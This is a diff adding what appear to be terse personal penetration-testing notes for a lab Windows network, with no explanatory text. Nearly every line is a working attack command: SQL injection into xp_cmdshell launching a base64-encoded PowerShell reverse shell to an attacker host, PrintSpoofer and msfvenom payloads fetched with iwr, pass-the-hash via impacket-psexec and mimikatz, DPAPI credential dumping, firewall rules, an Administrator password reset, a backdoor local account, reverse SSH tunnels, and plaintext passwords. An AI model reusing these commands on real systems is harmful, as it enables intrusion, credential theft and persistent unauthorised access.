@@ -1,0 +1,60 @@
+## Get into WEB02
+
+impacket-psexec -hashes 00000000000000000000000000000000:b2c03054c306ac8fc5f9d188710b0168 Administrator@192.168.186.121
+impacket-psexec -hashes 00000000000000000000000000000000:08d7a47a6f9f66b97b1bae4178747494 joe@192.168.221.121
+
+
+'; EXECUTE xp_cmdshell 'powershell -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADIAMAAwACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==';--
+
+iwr -uri http://192.168.45.200/PrintSpoofer64.exe -Outfile PrintSpoofer64.exe
+
+.\PrintSpoofer64.exe -i -c 'powershell -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADIAMAAwACIALAA0ADQANAA1ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=='
+
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.204 LPORT=4446 -f exe > shell-x64.exe
+
+iwr -uri http://192.168.45.204/shell-x64.exe -Outfile shell.exe
+
+netsh advfirewall firewall add rule name="rdp_ingress" protocol=TCP dir=in localip=192.168.221.121 localport=3389 action=allow
+
+
+
+## Do other shite
+
+$Password = ConvertTo-SecureString "12345abcde" -AsPlainText -Force
+Get-LocalUser -Name "Administrator" | Set-LocalUser -Password $Password
+
+
+Add-LocalGroupMember -Group "Remote Desktop Users" -Member joe
+
+cmd.exe /c echo y | C:\Users\plink.exe -ssh -l kali -pw kali -R 127.0.0.1:1080:127.0.0.1:3389 192.168.45.200
+
+ssh -N -R 1080 kali@192.168.45.200
+
+$username = 'joe'
+$password = 'Flowers1'
+$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
+$credential = New-Object System.Management.Automation.PSCredential ($username, $securePassword)
+
+Invoke-Command -ComputerName $args[0] -Credential $credential -ScriptBlock { echo "Wassup" }
+
+Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\ -OutputPrefix "domain-audit"
+
+impacket-psexec -hashes 00000000000000000000000000000000:b2c03054c306ac8fc5f9d188710b0168 Administrator@192.168.221.121
+
+iwr -uri http://192.168.45.200/Set-UserRights.ps1 -Outfile Set-UserRights.ps1
+
+sekurlsa::pth /user:joe /domain:medtech.com /ntlm:08D7A47A6F9F66B97B1BAE4178747494 /run:C:\Users\shell2.exe
+
+sekurlsa::dpapi
+
+dpapi::cred /in:"C:\Users\joe\AppData\Roaming\Microsoft\Protect\S-1-5-21-976142013-3766213998-138799841-1106\50031e8b-b62e-49c8-85c4-7d5cf4bdaf3c" /masterkey:b637c89d0a820d96cf547a4adc59e720cda0c029a915d2729a571c74fc124a61126bccc0fc500845c8d12f8a47ac0f3adf5588da602fc7b9f2b155771b17650f
+
+[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('$client = New-Object System.Net.Sockets.TCPClient("192.168.45.200",4447);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'))
+
+1..1024 | % {echo ((New-Object Net.Sockets.TcpClient).Connect("", $_)) "TCP port $_ is open"} 2>$null
+
+netsh advfirewall firewall add rule name="ssh_in" protocol=TCP dir=in localip=192.168.231.121 localport=22 action=allow
+
+New-LocalUser -Name 'ggill2' -Description 'haxing' -Password $password
+
+Invoke-Sqlcmd  -ConnectionString "Data Source='localhost\SQLEXPRESS'; User Id='sa'; Password ='WhileChirpTuesday218'" -Query "SELECT * FROM webapp.dbo.users;"  | Format-Table
